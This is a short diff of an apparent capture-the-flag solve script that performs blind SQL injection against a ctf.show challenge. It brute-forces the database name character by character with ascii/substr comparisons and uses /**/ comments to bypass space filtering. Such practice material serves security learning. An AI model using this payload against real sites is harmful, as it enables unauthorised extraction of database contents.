@@ -3,7 +3,7 @@ import warnings
 warnings.filterwarnings("ignore")
 word=""
 num=0
-url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id=1/**/and/**/"
+url = "https://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id=0/**/or/**/"
 for num1 in range(1,8):
     for num2 in range (65,123):
         data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
